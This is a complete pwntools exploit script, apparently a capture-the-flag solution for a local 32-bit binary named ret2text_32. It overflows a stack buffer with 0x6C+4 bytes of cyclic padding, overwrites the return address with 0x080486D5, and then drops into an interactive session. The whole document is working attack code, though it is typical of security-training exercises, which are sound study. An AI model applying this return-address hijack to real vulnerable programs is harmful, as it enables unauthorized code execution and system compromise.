from pwn import *

context.log_level = "debug"

io = process("./ret2text_32")
payload = flat([cyclic(0x6C + 4), 0x080486D5])
io.sendlineafter(b"anything?\n", payload)
io.interactive()
